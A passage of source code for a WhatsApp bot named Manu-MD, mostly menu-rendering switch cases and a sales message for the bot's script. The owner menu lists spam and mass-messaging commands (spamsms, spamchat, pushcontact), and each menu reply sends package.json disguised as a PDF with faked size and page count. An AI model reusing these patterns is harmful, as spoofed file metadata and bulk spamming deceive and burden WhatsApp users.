title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break
//========================
      case '📘 menampilkan script':
      case 'script manu-md':
      case 'command script':
      case 'sc':
      case 'script':
      case 'source':
      if (!isRegistered) return terdaftar()
      if (isBan) return terbanned()
        const uploadFile = { upload: Al.waUploadToServer };
        var imageMessage = await prepareWAMessageMedia(
          {
            image: { url: `${global.thumb}` },
          },
          uploadFile,
        );
        const product = {
          productImage: imageMessage.imageMessage,
          productId: "375984352103936",
          title: "ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙",
          description: "Are You Want Script?",
          currencyCode: "LKR",
          priceAmount1000: "150000000",
          productImageCount: 1,
        };
        const productData = {
          product: product,
          businessOwnerJid: global.owner+"@s.whatsapp.net",
        };
        const productMessage = { productMessage: productData };
        var response = await generateWAMessageFromContent(
          from,
          proto.Message.fromObject(productMessage),
          m.quoted && m.quoted.fromMe
            ? { contextInfo: { ...m.msg.contextInfo } }
            : { quoted: m },
        );
        await Al.relayMessage(from, response.message, {
          messageId: response.key.id,
        });
        await Al.sendMessage(from, {text:
            `*SCRIPT INFO*\n\n*Creator :* 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥\n*නිර්මාණය කරන ලද්දේ :* 30 මැයි, 2024\n*සියලු පහසුකම් :* 1100+ විධාන\n*මිළ :* පුද්ගලිකයි\n\nAre You want script? Contact Owner:V\n\n© ${global.wm} | ${tahun}`}, { quoted: floc})
        break;
//========================
case 'mainmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
var { totalGb, usedGb, freeGb } = await nou.drive.info()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
let gif = `${global.gifin}`
let main = `
 ╶─────────────┈•∘
    _〈 ❏ 〉  ＭＡＩＮ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️credit
 │ ィ•  ${prefix}🌥️tqto
 │ ィ•  ${prefix}🌥️test
 │ ィ•  ${prefix}🌥️ping
 │ ィ•  ${prefix}🌥️script
 │ ィ•  ${prefix}🌥️donasi
 │ ィ•  ${prefix}🌥️payment
 │ ィ•  ${prefix}🌥️topup-dana
 │ ィ•  ${prefix}🌥️topup-gopay
 │ ィ•  ${prefix}🌥️topup-ovo
 │ ィ•  ${prefix}🌥️infobot
 │ ィ•  ${prefix}🌥️totalfitur
 │ ィ•  ${prefix}🌥️ownerinfo
 │ ィ•  ${prefix}🌥️botinfo
 │ ィ•  ${prefix}🌥️pulsa
 │ ィ•  ${prefix}🌥️gcbot
 │ ィ•  ${prefix}🌥️rulesbot
 │ ィ•  ${prefix}🌥️youtube
 │ ィ•  ${prefix}🌥️info
 ╵`
await Al.sendMessage(m.chat, {video: {url: gif}, gifPlayback: true, caption: main,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'groupmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let gc = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＧＲＯＵＰ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️intro
 │ ィ•  ${prefix}🌥️buka
 │ ィ•  ${prefix}🌥️tutup
 │ ィ•  ${prefix}🌥️autodl
 │ ィ•  ${prefix}🌥️setppgc
 │ ィ•  ${prefix}🌥️setppgcful
 │ ィ•  ${prefix}🌥️setppgc1
 │ ィ•  ${prefix}🌥️delppgc
 │ ィ•  ${prefix}🌥️setdesc
 │ ィ•  ${prefix}🌥️setnamegc
 │ ィ•  ${prefix}🌥️prank
 │ ィ•  ${prefix}🌥️opentime
 │ ィ•  ${prefix}🌥️closetime
 │ ィ•  ${prefix}🌥️getidgc
 │ ィ•  ${prefix}🌥️cekmember
 │ ィ•  ${prefix}🌥️polling
 │ ィ•  ${prefix}🌥️jodohku
 │ ィ•  ${prefix}🌥️listonline
 │ ィ•  ${prefix}🌥️call
 │ ィ•  ${prefix}🌥️afk
 │ ィ•  ${prefix}🌥️add
 │ ィ•  ${prefix}🌥️kick
 │ ィ•  ${prefix}🌥️linkgc
 │ ィ•  ${prefix}🌥️delete
 │ ィ•  ${prefix}🌥️delete1
 │ ィ•  ${prefix}🌥️promote
 │ ィ•  ${prefix}🌥️demote
 │ ィ•  ${prefix}🌥️promoteall
 │ ィ•  ${prefix}🌥️demoteall
 │ ィ•  ${prefix}🌥️revoke
 │ ィ•  ${prefix}🌥️delete2
 │ ィ•  ${prefix}🌥️setleft
 │ ィ•  ${prefix}🌥️changeleft
 │ ィ•  ${prefix}🌥️delsetleft
 │ ィ•  ${prefix}🌥️antilink
 │ ィ•  ${prefix}🌥️antifoto
 │ ィ•  ${prefix}🌥️antipromo
 │ ィ•  ${prefix}🌥️antitoxic
 │ ィ•  ${prefix}🌥️antiwame
 │ ィ•  ${prefix}🌥️antilinkfb
 │ ィ•  ${prefix}🌥️antilinkig
 │ ィ•  ${prefix}🌥️antilinktele
 │ ィ•  ${prefix}🌥️antilinkytch
 │ ィ•  ${prefix}🌥️antilinkytvid
 │ ィ•  ${prefix}🌥️antilinktt
 │ ィ•  ${prefix}🌥️antilinkxxnx
 │ ィ•  ${prefix}🌥️autosticker
 │ ィ•  ${prefix}🌥️autodlgc
 │ ィ•  ${prefix}🌥️antilinkall
 │ ィ•  ${prefix}🌥️antilinktwt
 │ ィ•  ${prefix}🌥️antilinksfile
 │ ィ•  ${prefix}🌥️antilinkdc
 │ ィ•  ${prefix}🌥️antidoc
 │ ィ•  ${prefix}🌥️antiloc
 │ ィ•  ${prefix}🌥️anticon
 │ ィ•  ${prefix}🌥️antidelete
 │ ィ•  ${prefix}🌥️antivo
 │ ィ•  ${prefix}🌥️antivideo
 │ ィ•  ${prefix}🌥️antiaudio
 │ ィ•  ${prefix}🌥️antiteks
 │ ィ•  ${prefix}🌥️antivirtex
 │ ィ•  ${prefix}🌥️myrespon
 │ ィ•  ${prefix}🌥️hidetag
 │ ィ•  ${prefix}🌥️totag
 │ ィ•  ${prefix}🌥️userjid
 │ ィ•  ${prefix}🌥️getppgc
 │ ィ•  ${prefix}🌥️getpp
 │ ィ•  ${prefix}🌥️getnamegc
 │ ィ•  ${prefix}🌥️getdesc
 │ ィ•  ${prefix}🌥️infogc
 │ ィ•  ${prefix}🌥️getname
 │ ィ•  ${prefix}??️welcome
 │ ィ•  ${prefix}🌥️goodbye
 │ ィ•  ${prefix}🌥️setwelcome
 │ ィ•  ${prefix}🌥️delsetwelcome
 │ ィ•  ${prefix}🌥️changewelcome
 │ ィ•  ${prefix}🌥️getname1
 │ ィ•  ${prefix}🌥️bcgc
 │ ィ•  ${prefix}🌥️tagadmin
 │ ィ•  ${prefix}🌥️invite
 │ ィ•  ${prefix}🌥️whocecan
 │ ィ•  ${prefix}🌥️whocogan
 │ ィ•  ${prefix}🌥️jodoh
 │ ィ•  ${prefix}🌥️jadian
 │ ィ•  ${prefix}🌥️anaksukses
 │ ィ•  ${prefix}🌥️gay
 │ ィ•  ${prefix}🌥️grup *open/close*
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `*𝙵𝚞??𝚒𝚗𝚊 𝙼𝙳 💙*`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: gc,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃?? 𝑾𝒂𝒏?? 💙',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'downloadmenu':
case 'downloadmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let dl = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  Ｄ O W NＬＯ A Ｄ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️play
 │ ィ•  ${prefix}🌥️ytmp4
 │ ィ•  ${prefix}🌥️ytmp3
 │ ィ•  ${prefix}🌥️tiktok
 │ ィ•  ${prefix}🌥️tiktokmp3
 │ ィ•  ${prefix}🌥️tiktokslide
 │ ィ•  ${prefix}🌥️twitter
 │ ィ•  ${prefix}🌥️instagram
 │ ィ•  ${prefix}🌥️facebook
 │ ィ•  ${prefix}🌥️capcut
 │ ィ•  ${prefix}🌥️pinterest 
 │ ィ•  ${prefix}🌥mediafire
 │ ィ•  ${prefix}🌥️gitclone
 │ ィ•  ${prefix}🌥️gdrive
 │ ィ•  ${prefix}🌥️playstore
 │ ィ•  ${prefix}🌥️happymod
 │ ィ•  ${prefix}🌥️spotify
 │ ィ•  ${prefix}🌥️spotifys
 │ ィ•  ${prefix}🌥️tinyurl
 │ ィ•  ${prefix}🌥️playstore
 │ ィ•  ${prefix}🌥️megadl
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: dl,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: "??𝙝𝙖𝙣𝙚𝙡 𝙄𝙣𝙛𝙤 𝙈𝘼𝙉𝙐-𝙈𝘿 💙",
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'toolsmenu':
case 'bahansticker':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let s = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＴＯＯＬＳ  ＳＴＩＫＥＲ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️kill
 │ ィ•  ${prefix}🌥️pat 
 │ ィ•  ${prefix}🌥️lick 
 │ ィ•  ${prefix}🌥️bite 
 │ ィ•  ${prefix}🌥️yeet
 │ ィ•  ${prefix}🌥️bonk 
 │ ィ•  ${prefix}🌥️wink 
 │ ィ•  ${prefix}🌥️poke 
 │ ィ•  ${prefix}🌥️nom 
 │ ィ•  ${prefix}🌥️slap 
 │ ィ•  ${prefix}🌥️smile 
 │ ィ•  ${prefix}🌥️wave 
 │ ィ•  ${prefix}🌥️blush 
 │ ィ•  ${prefix}🌥️glomp 
 │ ィ•  ${prefix}🌥️happy 
 │ ィ•  ${prefix}🌥️dance 
 │ ィ•  ${prefix}🌥️cringe 
 │ ィ•  ${prefix}🌥️highfive
 │ ィ•  ${prefix}🌥️handhold
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: s,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'storemenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let store = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＳＴＯＲＥ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️addtesti
 │ ィ•  ${prefix}🌥️testimoni
 │ ィ•  ${prefix}🌥️deltesti
 │ ィ•  ${prefix}🌥️list
 │ ィ•  ${prefix}🌥️tambah
 │ ィ•  ${prefix}🌥️kurang
 │ ィ•  ${prefix}🌥️kali
 │ ィ•  ${prefix}🌥️bagi
 │ ィ•  ${prefix}🌥️reqpesanan
 │ ィ•  ${prefix}🌥️store
 │ ィ•  ${prefix}🌥️addlist
 │ ィ•  ${prefix}🌥️dellist
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: store,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'ownermenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let own =`
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＯＷＮＥＲ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️listgc
 │ ィ•  ${prefix}⛅spamsms
 │ ィ•  ${prefix}🌥️listpc
 │ ィ•  ${prefix}🌥️getpp
 │ ィ•  ${prefix}🌥️setppbot
 │ ィ•  ${prefix}🌥️setppful
 │ ィ•  ${prefix}🌥️setbiobot
 │ ィ•  ${prefix}🌥️setnamabot
 │ ィ•  ${prefix}🌥️delppbot
 │ ィ•  ${prefix}🌥️setmenu
 │ ィ•  ${prefix}🌥️creategc
 │ ィ•  ${prefix}🌥️join
 │ ィ•  ${prefix}🌥️out 
 │ ィ•  ${prefix}🌥️jpm
 │ ィ•  ${prefix}🌥️addowner
 │ ィ•  ${prefix}🌥️delowner
 │ ィ•  ${prefix}🌥️addprem
 │ ィ•  ${prefix}🌥️delprem
 │ ィ•  ${prefix}🌥️listprem
 │ ィ•  ${prefix}🌥️delsampah
 │ ィ•  ${prefix}🌥️delsampah2 
 │ ィ•  ${prefix}🌥️getcase
 │ ィ•  ${prefix}🌥️resetlimit
 │ ィ•  ${prefix}🌥️myip
 │ ィ•  ${prefix}🌥️mode
 │ ィ•  ${prefix}🌥️onlygc
 │ ィ•  ${prefix}🌥️addlimit
 │ ィ•  ${prefix}🌥️pushcontact
 │ ィ•  ${prefix}🌥️pushcontactv2
 │ ィ•  ${prefix}🌥️verify
 │ ィ•  ${prefix}🌥️banned
 │ ィ•  ${prefix}🌥️kenon
 │ ィ•  ${prefix}🌥️logout
 │ ィ•  ${prefix}🌥️spamchat
 │ ィ•  ${prefix}🌥️block
 │ ィ•  ${prefix}🌥️unblock
 │ ィ•  ${prefix}🌥️listblock
 │ ィ•  ${prefix}🌥️ban
 │ ィ•  ${prefix}🌥️unban
 │ ィ•  ${prefix}🌥️listban
 │ ィ•  ${prefix}🌥️listowner
 │ ィ•  ${prefix}🌥️autoswview
 │ ィ•  ${prefix}🌥️addcase
 │ ィ•  ${prefix}🌥️delcase
 │ ィ•  ${prefix}🌥️bcgc1
 │ ィ•  ${prefix}🌥️bcgc
 │ ィ•  ${prefix}🌥️sendfitur
 │ ィ•  ${prefix}🌥️dashboard
 │ ィ•  ${prefix}🌥️delchat
 │ ィ•  ${prefix}🌥️clearchat
 │ ィ•  ${prefix}🌥️backup
 │ ィ•  ${prefix}🌥️getfunc
 │ ィ•  ${prefix}🌥️gantifile
 │ ィ•  ${prefix}🌥️delfolder
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: own,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'othermenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let o = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＯＴＨＥＲ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️sewa
 │ ィ•  ${prefix}🌥️sewabot
 │ ィ•  ${prefix}🌥️credit
 │ ィ•  ${prefix}🌥️script
 │ ィ•  ${prefix}🌥️stickerwm
 │ ィ•  ${prefix}🌥️swm
 │ ィ•  ${prefix}🌥️stickergifwm
 │ ィ•  ${prefix}🌥️sgifwm
 │ ィ•  ${prefix}🌥️wm
 │ ィ•  ${prefix}🌥️sticker
 │ ィ•  ${prefix}🌥️smeme
 │ ィ•  ${prefix}🌥️smeta
 │ ィ•  ${prefix}🌥️jarak
 │ ィ•  ${prefix}🌥️qc
 │ ィ•  ${prefix}🌥️qcimg
 │ ィ•  ${prefix}🌥️emojimix
 │ ィ•  ${prefix}🌥️attp
 │ ィ•  ${prefix}🌥️readvo
 │ ィ•  ${prefix}🌥️ppcp
 │ ィ•  ${prefix}🌥️nulis
 │ ィ•  ${prefix}🌥️ssweb
 │ ィ•  ${prefix}🌥️shinobu
 │ ィ•  ${prefix}??️wallnime
 │ ィ•  ${prefix}🌥️pantun
 │ ィ•  ${prefix}🌥️meme
 │ ィ•  ${prefix}🌥️artinama
 │ ィ•  ${prefix}🌥️artimimpi
 │ ィ•  ${prefix}🌥️infocuaca
 │ ィ•  ${prefix}🌥️infogempa
 │ ィ•  ${prefix}🌥️jadwaltv
 │ ィ•  ${prefix}🌥️jadwaltvnow
 │ ィ•  ${prefix}🌥️torvo
 │ ィ•  ${prefix}🌥️ceritahoror
 │ ィ•  ${prefix}🌥️request
 │ ィ•  ${prefix}🌥️report
 │ ィ•  ${prefix}🌥️getkontak
 │ ィ•  ${prefix}🌥️getmusic
 │ ィ•  ${prefix}🌥️getvideo
 │ ィ•  ${prefix}🌥️wmvideo
 │ ィ•  ${prefix}🌥️profil
 │ ィ•  ${prefix}🌥️cuaca5
 │ ィ•  ${prefix}🌥️covidinfo
 │ ィ•  ${prefix}🌥️blurimg
 │ ィ•  ${prefix}🌥️wallml
 │ ィ•  ${prefix}🌥️ulzzanggirl
 │ ィ•  ${prefix}🌥️ulzzangboy
 │ ィ•  ${prefix}🌥️ryujin
 │ ィ•  ${prefix}🌥️rose
 │ ィ•  ${prefix}🌥️pubg
 │ ィ•  ${prefix}🌥️profilepic
 │ ィ•  ${prefix}🌥️couplepic
 │ ィ•  ${prefix}🌥️car
 │ ィ•  ${prefix}🌥️notnot
 │ ィ•  ${prefix}🌥️kpop
 │ ィ•  ${prefix}🌥️kayes
 │ ィ•  ${prefix}🌥️justina
 │ ィ•  ${prefix}🌥️doggo
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: o,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: "𝘾𝙝𝙖𝙣𝙚𝙡 𝙄𝙣𝙛𝙤 𝙈𝘼𝙉𝙐-𝙈𝘿 💙",
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'pushmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let push =`
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＰＵＳＨ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️pushcontact <teks|teks>
 │ ィ•  ${prefix}🌥️pushcontactv2 <idgroup|jeda|teks>
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: push,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break

case 'convertmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let cv =`
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＣＯＮＶＥＲＴ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️toptv
 │ ィ•  ${prefix}🌥️tovn
 │ ィ•  ${prefix}🌥️say
 │ ィ•  ${prefix}🌥️toimg
 │ ィ•  ${prefix}🌥️togif
 │ ィ•  ${prefix}🌥️tomp4
 │ ィ•  ${prefix}🌥️toaudio
 │ ィ•  ${prefix}🌥️tomp3
 │ ィ•  ${prefix}🌥️tourl
 │ ィ•  ${prefix}🌥️tourl1
 │ ィ•  ${prefix}🌥️togif1
 │ ィ•  ${prefix}🌥️tovn1
 │ ィ•  ${prefix}🌥️toaudio1
 │ ィ•  ${prefix}🌥️torvo
 │ ィ•  ${prefix}🌥️hdvid
 │ ィ•  ${prefix}🌥️txt2img
 │ ィ•  ${prefix}🌥️txt2video
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: cv,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break
case 'jadibotmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let bot = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＣＬＯＮＥ  ＭＥＮＵ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️start <Pairing>
 │ ィ•  ${prefix}🌥️restart 
 │ ィ•  ${prefix}🌥️credit
 ╵`
await Al.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            mimetype: "application/pdf",
            fileLength: 99999999999999,
            pageCount: 2024, caption: bot,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
title: `© 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`, 
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
    await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
}
break
//========================
case 'sistemmenu':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let yuu = `
 ╶─────────────┈•∘
  _〈 ❏ 〉  ＳＩＳＴＥＭ  ＧＲＵＢ_
 ┌─────────────┈•∘
 │ ィ•  ${prefix}🌥️antilink
 │ ィ•  ${prefix}🌥️antifoto
 │ ィ•  ${prefix}🌥️antipromo
 │ ィ•  ${prefix}🌥️antitoxic
 │ ィ•  ${prefix}🌥️antiwame
 │ ィ•  ${prefix}🌥️antilinkfb
 │ ィ•  ${prefix}🌥️antilinkig
 │ ィ•  ${prefix}🌥️antilinktele
 │ ィ•  ${prefix}🌥️antilinkytch
 │ ィ•  ${prefix}🌥️antilinkytvid
 │ ィ•  ${prefix}🌥️antilinktt
 │ ィ•  ${prefix}🌥️antilinkxxnx
 │ ィ•  ${prefix}🌥️autosticker
 │ ィ•  ${prefix}🌥️autodlgc
 │ ィ•  ${prefix}🌥️antilinkall
 │ ィ•  ${prefix}🌥️antilinktwt
 │ ィ•  ${prefix}🌥️antilinksfile
 │ ィ•  ${prefix}🌥️antilinkdc
 │ ィ•  ${prefix}🌥️antidoc
 │ ィ•  ${prefix}🌥️antiloc
 │ ィ•  ${prefix}🌥️anticon
 │ ィ•  ${prefix}🌥️antivideo
 │ ィ•  ${prefix}🌥antiaudio
 │ ィ•  ${prefix}🌥️antiteks
 │ ィ•  ${prefix}🌥️antidelete
